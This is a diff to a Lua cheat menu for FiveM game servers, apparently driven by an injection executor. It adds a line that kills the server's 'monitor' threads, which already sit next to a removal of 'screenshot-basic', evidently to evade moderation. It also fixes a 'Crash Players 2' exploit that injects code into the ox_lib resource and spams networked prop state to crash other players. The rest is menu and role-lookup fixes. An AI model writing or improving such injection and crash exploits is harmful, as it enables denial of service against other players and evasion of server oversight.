@@ -36,6 +36,7 @@ NextAPI.AddCommandListener(function(commandName, rawCommand, resourceName)
 end)
 
 NextAPI.Scripting.RemoveAllThreadsRes('screenshot-basic')
+NextAPI.Scripting.RemoveAllThreadsRes('monitor')
 
 local __nativeCreateThread = Citizen.CreateThread or CreateThread
 local nt = {
@@ -362,20 +363,24 @@ end,
             return name
         end,
         get_role = function()
-            local users = {
-                ["Jhon47"] = "Owner",
-                ["hn2"] = "Owner",
-                ["Pecinha123"] = "Owner",
-                ["dudurlk"] = "Amigo da Next",
-                ["LevyLife"] = "Amigo da Next",
-                ["guimvp"] = "Amigo da Next",
-                ["bmnext"] = "Amigo da Next",
-                ["Japa"] = "Amigo da Next",
-                ["Thegod"] = "Amigo da Next"
+            local ok, username = pcall(function()
+                return NextAPI.GetExecUser()
+            end)
+            if not ok or type(username) ~= "string" or username == "" then
+                return "Cliente"
+            end
+            username = username:lower()
+            local Cargos = {
+                Dono    = { "jhon47", "pecinha123", "Gbzin", "hn2" },
+                Dev     = { "devexemplo", "programador123" },
+                Streamer = { "streamerexemplo", "youtuber123" },
+                Amigo   = { "dudurlk", "levylife" },
             }
-            for username, cargo in pairs(users) do
-                if next.cargos.get_username() == username then
-                    return cargo
+            for cargo, lista in pairs(Cargos) do
+                for _, nome in ipairs(lista) do
+                    if nome == username then
+                        return cargo
+                    end
                 end
             end
             return "Cliente"
@@ -5092,6 +5097,10 @@ end
     my.interact.sliders = my.interact.sliders or {}
     my.interact.sliderAnimations = my.interact.sliderAnimations or {}
     my.interact.slider = function (id, text, desc, format, values, func, funcdrag)
+        -- Reinitialize animation state if my.interact was recreated by the menu.
+        my.interact.sliders = my.interact.sliders or {}
+        my.interact.sliderAnimations = my.interact.sliderAnimations or {}
+
         local canDisplay, x, y = nextGroupboxInfo()
         if not canDisplay then
             return
@@ -12137,24 +12146,18 @@ end)
 
 
 next.elements.button("Crash Players 2", "crash_original", function(state)
-NextAPI.Scripting.HookNativeForResource("DeleteEntity", false, "ox_lib")
-NextAPI.Scripting.HookNativeForResource("DeleteObject", false, "ox_lib")
-NextAPI.Scripting.HookNativeForResource("RemoveObject", false, "ox_lib")
-NextAPI.Scripting.HookNativeForResource("SetEntityAsNoLongerNeeded", false, "ox_lib")
-NextAPI.Scripting.HookNativeForResource("SetObjectAsNoLongerNeeded", false, "ox_lib")
-NextAPI.Scripting.HookNativeForResource("SetEntityAsMissionEntity", false, "ox_lib")
 NextAPI.Inject("ox_lib", [[
     _G.CreateObject = function()
         return 0
     end
-
-
+    
     local OX_SPAWN_LIMIT = GetConvarInt('ox:progressPropLimit', 2)
     local RES_NAME = "ox_lib"
     local LOCAL_STORAGE_KEY = "lib:progressProps"
     
     local function setObjs(value)
         local valueT = type(value)
+        --print("Setting props: " .. (valueT == "table" and #value or tostring(value)))
         LocalPlayer.state:set(LOCAL_STORAGE_KEY, value, true)
         Wait(1)
     end
@@ -12177,9 +12180,35 @@ NextAPI.Inject("ox_lib", [[
         return computedProps
     end
     
+    local function estimateMsgPackSize(props)
+        if not props or type(props) ~= "table" then return 0 end
+    
+        local size = 2 -- array header MsgPack
+        for _, prop in ipairs(props) do
+            size = size + 1 -- map header
+            -- "model" (5 chars) + hash int32 = 5 + 1 + 5 = 11
+            size = size + 11
+            -- "rot" (3 chars) + array di 3 float = 3 + 1 + 1 + (5*3) = 20
+            size = size + 20
+            -- "rotOrder" (8 chars) + int = 8 + 1 + 1 = 10
+            size = size + 10
+            -- "coords" (6 chars) + array di 3 float = 6 + 1 + 1 + (5*3) = 23
+            size = size + 23
+            -- "bone" (4 chars) + int = 4 + 1 + 1 = 6
+            size = size + 6
+            -- "pos" (3 chars) + array di 3 float = 3 + 1 + 1 + (5*3) = 20
+            size = size + 20
+        end
+    
+        return size
+    end
     
     local function oxLibProps(models, count)
         local resState = GetResourceState(RES_NAME)
+        if resState ~= "started" then
+            print("Exploit not available in this server! #1")
+            return
+        end
     
         count = count * 2
         local batch = math.min(count, OX_SPAWN_LIMIT - 1)
@@ -12193,18 +12222,19 @@ NextAPI.Inject("ox_lib", [[
                 setObjs(props)
                 remaining = remaining - #props
 
-                local percentage = math.floor(((count - remaining) / count))
+                local percentage = math.floor(((count - remaining) / count) * 100)
+                Wait(30)
             end
         end)
     end
     
     oxLibProps(
         {
-    	"prop_cs_hand_radio"
+            "prop_cs_hand_radio"
         },
-        1000
+        550
     )
-]], "@@ox_lib/resource/interface/progress.lua")
+]])
 end)
 next.elements.button("Remover modo novato", "fds", function()
     if group == "Santa Group" then
@@ -13616,8 +13646,10 @@ end)
                             for _, input in pairs(my.interact.inputs) do
                                 input.active = false
                             end
-                            for _, slider in pairs(my.interact.sliderAnimations) do
-                                slider.active = false
+                            for _, slider in pairs(my.interact.sliderAnimations or {}) do
+                                if type(slider) == "table" then
+                                    slider.active = false
+                                end
                             end
                             SetNuiFocus(false, false)
                             SetNuiFocusKeepInput(false)
@@ -13802,6 +13834,25 @@ end)
     end
     my.rendering = {}
     my.rendering.renderTabs = function()
+        -- Restore the category renderer if the menu interaction table was partially reset.
+        if type(my.interact.tabCategory) ~= 'function' then
+            my.interact.tabCategory = function(text)
+                my.interact.tabVars = my.interact.tabVars or {pos = {x = 0, y = 0}, tabs = {}}
+                my.interact.tabVars.pos = my.interact.tabVars.pos or {x = 0, y = 0}
+                if my.interact.tabVars.pos.y > 0 then
+                    my.interact.tabVars.pos.y = my.interact.tabVars.pos.y + 6
+                end
+                local x = my.pos.subtabBackground.x + 9
+                local y = my.pos.subtabBackground.y + 75 + my.interact.tabVars.pos.y
+                my.texts.drawText(
+                    text or '', x, y + 1, false, 'left', 13.0,
+                    {92, 92, 102, 255}, 5, '##cleanTabCategory_'..tostring(text or '')
+                )
+                my.interact.tabVars.pos.y = my.interact.tabVars.pos.y + 25
+            end
+        end
+        my.interact.tabVars = my.interact.tabVars or {pos = {x = 0, y = 0}, tabs = {}}
+        my.interact.tabVars.pos = my.interact.tabVars.pos or {x = 0, y = 0}
         my.interact.tabVars.pos.x = 0
         local tabRowsHeight = 7 * 44
         local categoryLabelsHeight = (3 * 25) + (2 * 6)
